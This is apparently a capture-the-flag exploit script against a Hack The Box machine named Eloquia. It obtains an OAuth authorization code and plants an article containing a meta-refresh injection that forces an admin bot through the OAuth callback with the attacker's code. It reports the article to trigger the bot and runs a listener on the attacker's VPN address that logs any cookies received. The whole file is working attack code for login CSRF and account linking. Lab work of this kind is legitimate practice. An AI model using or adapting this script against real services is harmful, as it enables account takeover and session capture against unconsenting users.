#!/usr/bin/env python3
"""
Test if bot is authenticated by redirecting to a page that requires login
and having that page redirect back to us with status info.

Alternative: redirect to callback and see what happens, then redirect to our server.
"""
import requests
import threading
import time
import re
import os
import sys
import random
from http.server import HTTPServer, BaseHTTPRequestHandler
from io import BytesIO
from urllib.parse import urlparse, parse_qs, quote

TARGET_ELOQUIA = "http://eloquia.htb"
TMP_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tmp")
CLIENT_ID = "riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi"
REDIRECT_URI = "http://eloquia.htb/accounts/oauth2/qooqle/callback/"

def get_csrf(html):
    match = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', html)
    return match.group(1) if match else None

def load_credentials():
    try:
        with open(os.path.join(TMP_DIR, "username.txt")) as f:
            username = f.read().strip()
        with open(os.path.join(TMP_DIR, "password.txt")) as f:
            password = f.read().strip()
        return username, password
    except:
        return None, None

def create_banner_image():
    try:
        from PIL import Image
        img = Image.new('RGB', (200, 150))
        for i in range(200):
            for j in range(150):
                img.putpixel((i, j), (random.randint(0,255), random.randint(0,255), random.randint(0,255)))
        buf = BytesIO()
        img.save(buf, 'PNG')
        buf.seek(0)
        return buf
    except ImportError:
        print("[-] PIL not installed")
        sys.exit(1)

def get_tun0_ip():
    import subprocess
    try:
        result = subprocess.run(['ip', 'addr', 'show', 'tun0'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'inet ' in line:
                return line.split()[1].split('/')[0]
    except:
        pass
    return None

class DebugHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def handle(self):
        try:
            super().handle()
        except (ConnectionResetError, BrokenPipeError):
            pass

    def do_GET(self):
        print(f"\n{'='*60}")
        print(f"[INCOMING REQUEST]")
        print(f"  Path: {self.path}")
        print(f"  Client: {self.client_address}")

        ua = self.headers.get('User-Agent', '')
        is_bot = 'HeadlessChrome' in ua
        print(f"  Is Bot: {is_bot}")

        # Check for referrer - this tells us where they came from
        referer = self.headers.get('Referer', 'none')
        print(f"  Referer: {referer}")

        cookies = self.headers.get('Cookie', '')
        if cookies:
            print(f"  COOKIES: {cookies}")
        else:
            print(f"  NO COOKIES (external redirect)")

        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b'OK')

def main():
    username, password = load_credentials()
    if not username:
        print("[-] No credentials")
        sys.exit(1)

    callback_ip = get_tun0_ip()
    if not callback_ip:
        print("[-] No tun0 IP")
        sys.exit(1)

    print(f"[*] Starting debug server on {callback_ip}:8889")

    # Start server on different port
    server = HTTPServer(('0.0.0.0', 8889), DebugHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    # Login to Eloquia
    print(f"[*] Logging into Eloquia as {username}...")
    session = requests.Session()
    login_page = session.get(f"{TARGET_ELOQUIA}/accounts/login/")
    csrf = get_csrf(login_page.text)
    session.post(f"{TARGET_ELOQUIA}/accounts/login/",
        data={'csrfmiddlewaretoken': csrf, 'username': username, 'password': password},
        headers={'Referer': f"{TARGET_ELOQUIA}/accounts/login/"}
    )

    if 'sessionid' not in session.cookies:
        print("[-] Login failed")
        sys.exit(1)

    # Login to Qooqle and get OAuth code
    print(f"[*] Getting OAuth code from Qooqle...")
    qooqle = requests.Session()
    login_page = qooqle.get(f"http://qooqle.htb/login/")
    csrf = get_csrf(login_page.text)
    qooqle.post(f"http://qooqle.htb/login/",
        data={'csrfmiddlewaretoken': csrf, 'username': username, 'password': password},
        headers={'Referer': f"http://qooqle.htb/login/"}
    )

    # Get OAuth code
    auth_url = f"http://qooqle.htb/oauth2/authorize/?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}"
    auth_page = qooqle.get(auth_url)
    csrf = get_csrf(auth_page.text)

    resp = qooqle.post(auth_url,
        data={
            'csrfmiddlewaretoken': csrf,
            'redirect_uri': REDIRECT_URI,
            'scope': 'read write',
            'client_id': CLIENT_ID,
            'response_type': 'code',
            'allow': 'Authorize'
        },
        headers={'Referer': auth_url},
        allow_redirects=False
    )

    location = resp.headers.get('Location', '')
    code_match = re.search(r'code=([^&\s]+)', location)
    if not code_match:
        print("[-] No OAuth code")
        sys.exit(1)

    oauth_code = code_match.group(1)
    print(f"[+] Got OAuth code: {oauth_code[:20]}...")

    # Create article that redirects to callback, then to our server
    # Use JavaScript to chain redirects so we can see what happens
    timestamp = str(int(time.time()))

    # Simple meta refresh directly to callback
    callback_url = f"{REDIRECT_URI}?code={oauth_code}"
    final_redirect = f"http://{callback_ip}:8889/after_callback?ts={timestamp}"

    # Use an iframe to load callback silently, then redirect to our server
    # This way we see if callback was processed
    content = f'''<meta http-equiv="refresh" content="0;url={callback_url}">
<p>Processing...</p>'''

    print(f"[*] Creating article with redirect to callback...")
    print(f"    Callback: {callback_url[:60]}...")

    create_page = session.get(f"{TARGET_ELOQUIA}/article/create/")
    csrf = get_csrf(create_page.text)

    my_articles = session.get(f"{TARGET_ELOQUIA}/article/mine/")
    existing_ids = set(re.findall(r'article/visit/(\d+)', my_articles.text))

    resp = session.post(f"{TARGET_ELOQUIA}/article/create/",
        data={'csrfmiddlewaretoken': csrf, 'title': f"Auth {timestamp}", 'content': content},
        files={'banner': ('banner.png', create_banner_image(), 'image/png')},
        headers={'Referer': f"{TARGET_ELOQUIA}/article/create/"},
        timeout=60
    )

    # Find article ID
    article_id = None
    match = re.search(r'article/visit/(\d+)', resp.url + resp.text)
    if match:
        article_id = match.group(1)
    else:
        my_articles = session.get(f"{TARGET_ELOQUIA}/article/mine/")
        new_ids = set(re.findall(r'article/visit/(\d+)', my_articles.text))
        created = new_ids - existing_ids
        if created:
            article_id = max(created)

    if not article_id:
        print("[-] Failed to create article")
        sys.exit(1)

    # Report it
    print(f"[*] Article created: ID {article_id}")
    session.get(f"{TARGET_ELOQUIA}/article/report/{article_id}/")
    print(f"[*] Article reported")

    # Save the code so we can check if it was used
    with open(os.path.join(TMP_DIR, "debug_oauth_code.txt"), "w") as f:
        f.write(oauth_code)
    print(f"[*] Code saved to tmp/debug_oauth_code.txt")

    print(f"\n[*] Waiting for bot (2 minutes)...")
    print(f"[*] Will check if code was consumed afterward...\n")

    # Wait
    try:
        for i in range(120):
            print(f"\r    Waiting: {i}s  ", end='', flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        pass

    print("\n\n[*] Checking if code was consumed...")

    # Try to use the code
    test_session = requests.Session()
    resp = test_session.get(f"{REDIRECT_URI}?code={oauth_code}", allow_redirects=True)

    if 'sessionid' in test_session.cookies:
        print("[!] Code still works - bot did NOT use it!")
        print("    This means the bot either:")
        print("    - Didn't follow the redirect")
        print("    - Wasn't authenticated")
        print("    - Something blocked the callback")
    else:
        print("[+] Code was consumed - bot DID visit callback!")
        print("    But the linking didn't work...")
        print("    Checking error message:")
        print(f"    {resp.text[:200]}")

    server.shutdown()

if __name__ == "__main__":
    main()
